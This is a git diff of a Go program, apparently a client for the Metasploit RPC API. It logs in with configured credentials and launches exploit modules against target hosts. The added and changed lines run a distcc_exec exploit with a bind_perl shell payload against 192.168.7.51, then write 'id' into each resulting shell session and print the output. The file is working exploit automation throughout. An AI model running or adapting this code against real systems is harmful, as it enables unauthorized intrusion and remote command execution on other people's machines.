@@ -5,6 +5,7 @@ import (
 	"gomsfrpc/msfrpc"
 	"gomsfrpc/utils"
 	"time"
+
 	// Configuration
 	"log"
 )
@@ -14,10 +15,10 @@ var rpc *msfrpc.MSFRPC
 func init() {
 	iniParser := utils.IniParser{}
 	iniParser.Load("./config/config.ini")
-	rpcHost := iniParser.GetString("server","msfrpc_host")
-	rpcPort := iniParser.GetString("server","msgrpc_port")
-	rpcUser := iniParser.GetString("server","msgrpc_user")
-	rpcPass := iniParser.GetString("server","msfrpc_pass")
+	rpcHost := iniParser.GetString("server", "msfrpc_host")
+	rpcPort := iniParser.GetString("server", "msfrpc_port")
+	rpcUser := iniParser.GetString("server", "msfrpc_user")
+	rpcPass := iniParser.GetString("server", "msfrpc_pass")
 	rpc = msfrpc.NewMsfrpc(rpcHost, rpcPort, "/api", rpcUser, rpcPass, false)
 	_, err := rpc.AuthLogin()
 	if err != nil {
@@ -36,7 +37,7 @@ func getExplist(expType string) ([]string, error) {
 	return modulelist, nil
 }
 
-func runExploits(rhost string, rport string, moduleexp string, targetid string, payload string) (interface{}) {
+func runExploits(rhost string, rport string, moduleexp string, targetid string, payload string) interface{} {
 	option := make(map[string]interface{})
 	option["RHOST"] = rhost
 	option["RPORT"] = rport
@@ -58,7 +59,7 @@ func runExploits(rhost string, rport string, moduleexp string, targetid string, 
 	}
 	retmsg["jobinfo"] = jobinfos
 
-	time.Sleep(5 * time.Second)
+	time.Sleep(20 * time.Second)
 	sessions, err := rpc.SessionList()
 	if err != nil {
 		retmsg["state"] = 400
@@ -70,6 +71,9 @@ func runExploits(rhost string, rport string, moduleexp string, targetid string, 
 		if session.ExploitUuid == moduleExecuteResult.Uuid {
 			retmsg["sessioninfo"] = session
 		}
+		rpc.SessionShellWrite(session.SessionId, "id\n")
+		shellResult, _ := rpc.SessionShellRead(session.SessionId)
+		fmt.Print(shellResult)
 		rpc.SessionStop(session.SessionId)
 	}
 	rpc.JobStop(moduleExecuteResult.JobID)
@@ -103,7 +107,7 @@ func main() {
 	//fmt.Println(cmdlist)
 	//
 	getExplist("exploit")
-	result := runExploits("192.168.7.127", "445", "linux/samba/is_known_pipename", "0", "cmd/unix/interact")
+	result := runExploits("192.168.7.51", "3632", "exploit/unix/misc/distcc_exec", "0", "cmd/unix/bind_perl")
 	fmt.Println(result)
 	//
 	//moduleinfo, _ := rpc.ModuleInfo("exploit", "aix/local/ibstat_path")
